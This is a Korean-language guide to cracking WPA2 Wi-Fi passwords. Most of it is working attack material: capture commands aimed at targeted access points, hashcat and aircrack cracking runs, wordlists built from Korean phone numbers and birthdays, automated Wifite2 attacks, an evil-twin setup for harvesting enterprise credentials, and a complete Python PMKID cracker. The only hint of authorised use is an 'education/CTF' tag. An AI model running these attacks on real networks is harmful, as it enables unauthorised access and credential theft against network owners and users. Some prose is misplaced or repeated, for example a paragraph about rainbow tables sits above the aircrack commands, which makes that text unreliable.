# WPA2 크래킹 완전 가이드

## WPA2 크랙 전략 개요

```
WPA2 크랙 방법론
─────────────────────────────────────────
1. 핸드셰이크 수집
   └── 패시브 대기 OR Deauth 강제

2. PMKID 공격 (핸드셰이크 불필요, 2018)
   └── AP에서 직접 수집 가능

3. 오프라인 크래킹
   ├── 딕셔너리 공격 (wordlist)
   ├── 규칙 기반 (hashcat rules)
   ├── 마스크 공격 (패턴 기반)
   └── 레인보우 테이블 (pmkid-cache)

4. 성공 시 비밀번호 확인
─────────────────────────────────────────
```

---

## 1. Hashcat을 이용한 WPA2 크래킹

### 핸드셰이크 파일 변환

aircrack-ng 형식(.cap)의 핸드셰이크 파일을 hashcat이 처리할 수 있는 형식으로 변환합니다. hcxtools의 hcxpcapngtool을 사용합니다.

```bash
# aircrack-ng 캡처 파일 → hashcat 형식
# hcxdumptool/hcxtools 사용 (권장)
sudo apt install hcxdumptool hcxtools

# hcxdumptool으로 직접 캡처 (모든 AP)
sudo hcxdumptool \
    -i wlan0mon \
    -o capture.pcapng \
    --enable_status=3

# 특정 AP만 타겟
echo "AABBCCDDEEFF" > target.txt  # 타겟 BSSID (콜론 없이)
sudo hcxdumptool \
    -i wlan0mon \
    -o capture.pcapng \
    --filterlist_ap=target.txt \
    --filtermode=2

# pcapng → hashcat 형식 변환
hcxpcapngtool capture.pcapng -o capture.hc22000

# 기존 .cap 파일 변환
hcxpcapngtool capture.cap -o capture.hc22000

# 내용 확인
hcxhashtool -i capture.hc22000 --info=short
```

### Hashcat WPA2 크래킹

hashcat 모드 22000으로 WPA2 핸드셰이크나 PMKID를 크래킹합니다. GPU 가속으로 사전 공격과 마스크 공격을 결합하여 효율을 높입니다.

```bash
# 모드 22000 (WPA2 PMKID/핸드셰이크 통합)
# 모드 2500 (WPA2 핸드셰이크, 구버전)

# 딕셔너리 공격
hashcat -m 22000 capture.hc22000 /usr/share/wordlists/rockyou.txt

# 규칙 기반 공격 (효과적)
hashcat -m 22000 capture.hc22000 wordlist.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 22000 capture.hc22000 wordlist.txt -r /usr/share/hashcat/rules/rockyou-30000.rule

# 마스크 공격 (한국 비밀번호 패턴)
# ?d=숫자, ?u=대문자, ?l=소문자, ?a=모든 문자
hashcat -m 22000 capture.hc22000 -a 3 "?d?d?d?d?d?d?d?d"    # 8자리 숫자
hashcat -m 22000 capture.hc22000 -a 3 "?l?l?l?l?d?d?d?d"    # 소문자4+숫자4
hashcat -m 22000 capture.hc22000 -a 3 "?u?l?l?l?d?d?d?d"    # 대소문자+숫자
hashcat -m 22000 capture.hc22000 -a 3 "010?d?d?d?d?d?d?d?d" # 010으로 시작 전화번호

# 조합 공격 (두 wordlist 결합)
hashcat -m 22000 capture.hc22000 -a 1 wordlist1.txt wordlist2.txt

# 하이브리드 (딕셔너리 + 마스크)
hashcat -m 22000 capture.hc22000 -a 6 wordlist.txt "?d?d?d?d"  # 단어+숫자4개

# GPU 사용 최적화
hashcat -m 22000 capture.hc22000 wordlist.txt \
    -d 1 \              # GPU 장치 1 사용
    -w 4 \              # 워크로드 (1=저부하, 4=최대)
    --gpu-temp-abort=90  # 90°C 초과 시 중단

# 세션 저장/복원
hashcat -m 22000 capture.hc22000 wordlist.txt --session=my_session
hashcat -m 22000 --session=my_session --restore  # 이어서 진행

# 크랙된 비밀번호 확인
hashcat -m 22000 capture.hc22000 --show
```

### Aircrack-ng를 이용한 크래킹

rcrack으로 미리 생성된 레인보우 테이블을 사용하여 해시를 크래킹합니다. 저장 공간과 계산 시간을 교환(time-memory trade-off)하는 방식입니다.

```bash
# 딕셔너리 공격
aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt

# 특정 BSSID
aircrack-ng capture-01.cap \
    -b AA:BB:CC:DD:EE:FF \
    -w wordlist.txt

# 실시간 확인 (진행 상황)
aircrack-ng capture-01.cap -w wordlist.txt -q
```

---

## 2. PMKID 공격 (2018)


PMKID 공격은 클라이언트 없이도 AP의 EAPOL 첫 번째 프레임에서 PMKID를 추출하여 오프라인 크래킹을 수행합니다. `hcxdumptool`과 `hcxtools`로 캡처 후 hashcat으로 크래킹합니다.

```
기존: 클라이언트 핸드셰이크 필요 (시간 소요)
PMKID: AP에 연결 시도만으로 수집 가능

PMKID = HMAC-SHA1(PMK, "PMK Name" || BSSID || Client_MAC)
→ PMK = PBKDF2(PSK, SSID)
→ 오프라인 딕셔너리 공격 가능
```

PMKID 공격은 클라이언트 연결 없이도 AP에서 PMKID를 추출하여 WPA2 키를 오프라인으로 크래킹합니다. 2018년 발견된 기법으로 핸드셰이크 캡처보다 효율적입니다.

```bash
# PMKID 수집 (hcxdumptool)
sudo hcxdumptool \
    -i wlan0mon \
    -o pmkid.pcapng \
    --enable_status=3 \
    --filterlist_ap=target.txt

# 수집 즉시 확인
hcxhashtool -i pmkid.pcapng --pmkid | head

# hashcat 형식으로 변환
hcxpcapngtool pmkid.pcapng -o pmkid.hc22000

# 크래킹
hashcat -m 22000 pmkid.hc22000 wordlist.txt
```

---

## 3. Wordlist 최적화

### 효과적인 워드리스트 구성

WPA2 크래킹에 효과적인 워드리스트를 구성합니다. rockyou.txt를 기반으로 한국어 패턴(생년월일, 전화번호 등)을 추가하면 성공률이 높아집니다.

```bash
# 기본 워드리스트
/usr/share/wordlists/rockyou.txt          # 1400만개
/usr/share/wordlists/dirbuster/           # 웹 경로용

# 추가 워드리스트 다운로드
wget https://github.com/danielmiessler/SecLists/archive/master.zip
ls SecLists/Passwords/WiFi-WPA/

# 한국어 특화 워드리스트 생성
# 전화번호 패턴
python3 -c "
for i in range(0, 9999):
    print(f'010{i:08d}')
    print(f'011{i:08d}')
    print(f'016{i:08d}')
" > phone_numbers.txt

# 생년월일 패턴
python3 -c "
for year in range(1960, 2010):
    for month in range(1, 13):
        for day in range(1, 32):
            print(f'{year}{month:02d}{day:02d}')
" > birthdays.txt
```

### hashcat 규칙 파일 커스텀

```bash
# custom.rule - 한국 패턴에 최적화된 규칙
# 기본 단어 변형
:            # 원본 유지
l            # 전체 소문자
u            # 전체 대문자
c            # 첫 글자 대문자

# 숫자 추가
$1           # 끝에 1 추가
$123         # 끝에 123 추가
$1234        # 끝에 1234 추가
$!           # 끝에 ! 추가
$@           # 끝에 @ 추가

# 앞에 숫자 추가
^1           # 앞에 1 추가

# 년도 추가
$2024
$2023
$2022
$2021
$2020

# 교체
sa@          # a → @ 교체
se3          # e → 3 교체
si1          # i → 1 교체
so0          # o → 0 교체
```

```bash
# 규칙 적용
hashcat -m 22000 capture.hc22000 base_words.txt -r custom.rule

# 여러 규칙 동시 적용
hashcat -m 22000 capture.hc22000 wordlist.txt \
    -r rule1.rule \
    -r rule2.rule
```

---

## 4. John the Ripper

```bash
# 핸드셰이크 변환 (aircrack 형식)
# john-jumbo에서 지원
john --list=formats | grep WPA

# WPA2 크래킹
wpaclean clean.cap capture-01.cap  # 핸드셰이크 추출
aircrack-ng clean.cap -J john_file  # john 형식으로 변환

john john_file.hccap --wordlist=wordlist.txt

# 증분 공격 (Incremental)
john john_file.hccap --incremental

# 마스크 공격
john john_file.hccap --mask="?d?d?d?d?d?d?d?d"
```

---

## 5. Wifite2 - 자동화 공격

Wifite2는 무선 공격을 자동화하는 도구입니다. 주변 AP를 스캔하고 핸드셰이크 캡처, WPS 공격, PMKID 공격 등을 자동으로 수행합니다.

```bash
# Wifite2 설치
sudo apt install wifite

# 전체 자동 공격
sudo wifite

# 특정 BSSID
sudo wifite --bssid AA:BB:CC:DD:EE:FF

# 딕셔너리 지정
sudo wifite --dict /path/to/wordlist.txt

# WPS 공격만
sudo wifite --wps-only

# Deauth 비활성화 (조용한 모드)
sudo wifite --nodeauth

# 옵션
sudo wifite \
    --kill \            # 간섭 프로세스 종료
    --crack \           # 캡처 즉시 크래킹
    --dict rockyou.txt
```

---

## 6. 고급: PMKID 캐시 테이블


PMKID 공격은 클라이언트 없이도 AP의 EAPOL 첫 번째 프레임에서 PMKID를 추출하여 오프라인 크래킹을 수행합니다. `hcxdumptool`과 `hcxtools`로 캡처 후 hashcat으로 크래킹합니다.

```python
#!/usr/bin/env python3
"""
PMKID/WPA2 핸드셰이크 오프라인 크래킹 도구 (교육/CTF 목적)
사용: python3 pmkid_crack.py --ssid MyWiFi --pmkid d6fd... --ap-mac AA:BB --client-mac 11:22 --wordlist rockyou.txt
"""

from __future__ import annotations

import argparse
import hashlib
import hmac
import multiprocessing
import sys
import time
from dataclasses import dataclass
from pathlib import Path
from typing import Optional


# ------------------------------------------------------------------ #
#  WPA2 암호화 함수
# ------------------------------------------------------------------ #
def compute_pmk(password: str, ssid: str) -> bytes:
    """PMK = PBKDF2-HMAC-SHA1(password, ssid, 4096 rounds, 32 bytes)"""
    return hashlib.pbkdf2_hmac(
        "sha1",
        password.encode("utf-8", errors="replace"),
        ssid.encode("utf-8", errors="replace"),
        4096,
        32,
    )


def compute_pmkid(pmk: bytes, ap_mac_hex: str, client_mac_hex: str) -> str:
    """
    PMKID = HMAC-SHA1(PMK, b'PMK Name' || AP_MAC_bytes || Client_MAC_bytes)[:16]
    """
    ap_bytes = bytes.fromhex(ap_mac_hex.replace(":", "").replace("-", ""))
    client_bytes = bytes.fromhex(client_mac_hex.replace(":", "").replace("-", ""))
    data = b"PMK Name" + ap_bytes + client_bytes
    digest = hmac.new(pmk, data, hashlib.sha1).digest()
    return digest[:16].hex()


def compute_mic(pmk: bytes, ap_nonce: bytes, client_nonce: bytes,
                ap_mac: bytes, client_mac: bytes, eapol_data: bytes) -> str:
    """
    PTK 유도 후 MIC 계산 (4-Way Handshake 검증용)
    PTK = PRF-512(PMK, 'Pairwise key expansion' || min/max(macs) || min/max(nonces))
    """
    # PTK 유도 (802.11i PRF-512)
    def prf512(key: bytes, a: bytes, b: bytes) -> bytes:
        result = b""
        for i in range(4):
            result += hmac.new(key, a + b"\x00" + b + bytes([i]), hashlib.sha1).digest()
        return result[:64]

    min_mac = min(ap_mac, client_mac)
    max_mac = max(ap_mac, client_mac)
    min_nonce = min(ap_nonce, client_nonce)
    max_nonce = max(ap_nonce, client_nonce)

    ptk = prf512(
        pmk,
        b"Pairwise key expansion",
        min_mac + max_mac + min_nonce + max_nonce,
    )
    kck = ptk[:16]   # Key Confirmation Key
    mic = hmac.new(kck, eapol_data, hashlib.md5).hexdigest()
    return mic


# ------------------------------------------------------------------ #
#  크래킹 워커 (멀티프로세싱용)
# ------------------------------------------------------------------ #
def _crack_worker(
    chunk: list[str],
    ssid: str,
    target_pmkid: str,
    ap_mac: str,
    client_mac: str,
    result_queue: multiprocessing.Queue,
) -> None:
    for password in chunk:
        password = password.strip()
        if not password:
            continue
        try:
            pmk = compute_pmk(password, ssid)
            computed = compute_pmkid(pmk, ap_mac, client_mac)
            if computed == target_pmkid.lower():
                result_queue.put(("found", password))
                return
        except Exception:
            continue
    result_queue.put(("done", None))


# ------------------------------------------------------------------ #
#  크래커 메인 클래스
# ------------------------------------------------------------------ #
@dataclass
class PMKIDCracker:
    ssid: str
    target_pmkid: str
    ap_mac: str
    client_mac: str
    wordlist: str
    workers: int = multiprocessing.cpu_count()

    def crack(self) -> Optional[str]:
        wl_path = Path(self.wordlist)
        if not wl_path.exists():
            print(f"[-] 워드리스트 없음: {wl_path}", file=sys.stderr)
            return None

        # 워드리스트 전체 로드 (대용량이면 청크 처리)
        print(f"[*] 워드리스트 로드 중: {wl_path}", file=sys.stderr)
        try:
            with open(wl_path, encoding="latin-1", errors="replace") as fh:
                words = fh.readlines()
        except OSError as exc:
            print(f"[-] 파일 읽기 실패: {exc}", file=sys.stderr)
            return None

        total = len(words)
        print(f"[*] {total:,}개 단어 | 프로세스: {self.workers}개", file=sys.stderr)
        print(f"[*] 타겟 PMKID: {self.target_pmkid}", file=sys.stderr)
        print(f"[*] SSID: {self.ssid}  AP: {self.ap_mac}  Client: {self.client_mac}", file=sys.stderr)

        chunk_size = max(1, total // self.workers)
        chunks = [words[i : i + chunk_size] for i in range(0, total, chunk_size)]

        result_queue: multiprocessing.Queue = multiprocessing.Queue()
        processes = []
        for chunk in chunks:
            p = multiprocessing.Process(
                target=_crack_worker,
                args=(chunk, self.ssid, self.target_pmkid, self.ap_mac, self.client_mac, result_queue),
            )
            p.start()
            processes.append(p)

        start = time.time()
        found_pw: Optional[str] = None
        done_count = 0

        while done_count < len(processes):
            msg_type, value = result_queue.get()
            if msg_type == "found":
                found_pw = value
                for p in processes:
                    p.terminate()
                break
            else:
                done_count += 1

        for p in processes:
            p.join()

        elapsed = time.time() - start

        if found_pw:
            rate = total / elapsed if elapsed > 0 else 0
            print(f"\n[+] 비밀번호 발견: {found_pw}")
            print(f"[+] 경과 시간: {elapsed:.1f}초  속도: {rate:,.0f} PMK/s")
        else:
            print(f"\n[-] 비밀번호를 찾지 못했습니다. ({elapsed:.1f}초 / {total:,}개 시도)")

        return found_pw


# ------------------------------------------------------------------ #
#  CLI
# ------------------------------------------------------------------ #
def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="PMKID/WPA2 핸드셰이크 오프라인 크래킹 도구 (교육/CTF 목적)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="예시:\n"
               "  python3 pmkid_crack.py \\\n"
               "    --ssid MyWiFi \\\n"
               "    --pmkid d6fd3e50a1234567890abcdef1234567 \\\n"
               "    --ap-mac AA:BB:CC:DD:EE:FF \\\n"
               "    --client-mac 11:22:33:44:55:66 \\\n"
               "    --wordlist /usr/share/wordlists/rockyou.txt",
    )
    parser.add_argument("--ssid",       required=True, help="타겟 SSID")
    parser.add_argument("--pmkid",      required=True, help="수집된 PMKID (hex 32자)")
    parser.add_argument("--ap-mac",     required=True, help="AP BSSID (AA:BB:CC:DD:EE:FF)")
    parser.add_argument("--client-mac", required=True, help="클라이언트 MAC")
    parser.add_argument("--wordlist",   required=True, metavar="FILE", help="워드리스트 파일")
    parser.add_argument(
        "--workers", type=int, default=multiprocessing.cpu_count(),
        help=f"병렬 프로세스 수 (기본: {multiprocessing.cpu_count()})",
    )
    return parser


def main() -> None:
    parser = build_parser()
    args = parser.parse_args()

    if len(args.pmkid) != 32:
        parser.error("PMKID는 32자리 hex 문자열이어야 합니다")

    cracker = PMKIDCracker(
        ssid=args.ssid,
        target_pmkid=args.pmkid,
        ap_mac=args.ap_mac,
        client_mac=args.client_mac,
        wordlist=args.wordlist,
        workers=args.workers,
    )
    cracker.crack()


if __name__ == "__main__":
    main()
```

---

## 7. 성능 벤치마크

hashcat 벤치마크로 GPU 성능을 측정합니다. WPA2 모드의 초당 해시 수(H/s)를 확인하여 크래킹 예상 시간을 계산합니다.

```bash
# hashcat 성능 테스트
hashcat -b -m 22000

# 일반적인 성능 (GPU별)
# GTX 1080 Ti: ~500,000 H/s
# RTX 3090:    ~750,000 H/s
# RTX 4090:    ~1,100,000 H/s

# rockyou.txt (14M) 크래킹 예상 시간
# RTX 3090: ~19초 (딕셔너리)
# 8자리 숫자 전체: 100,000,000 / 750,000 = ~133초

# 클라우드 크래킹 (AWS)
# p3.2xlarge (V100): ~400,000 H/s
# 비용: 약 $3/시간

# 분산 크래킹 (Hashtopolis)
# 여러 GPU 서버 연동
# docker run hashtopolis/hashtopolis
```

---

## 8. WPA Enterprise (802.1X) 공격

WPA Enterprise(802.1X) 환경에서 PEAP/MSCHAPv2 자격증명을 캡처합니다. hostapd-wpe로 가짜 RADIUS 서버를 운영하여 자격증명을 가로챕니다.

```bash
# PEAP/MSCHAPv2 캡처 및 크래킹
# EAP 인증 패킷 수집
sudo airodump-ng wlan0mon --write enterprise_capture

# asleap으로 MSCHAPv2 크래킹
asleap -r enterprise_capture-01.cap \
       -W wordlist.txt

# hostapd-wpe (WPA Enterprise Evil Twin)
# 자격증명 수집용 가짜 RADIUS 서버
sudo apt install hostapd-wpe
# /etc/hostapd-wpe/hostapd-wpe.conf 설정 후:
sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf

# 캡처된 MSCHAPv2 챌린지/응답 크래킹
hashcat -m 5500 netntlm.txt wordlist.txt  # NTLMv1
hashcat -m 5600 netntlmv2.txt wordlist.txt  # NTLMv2
```
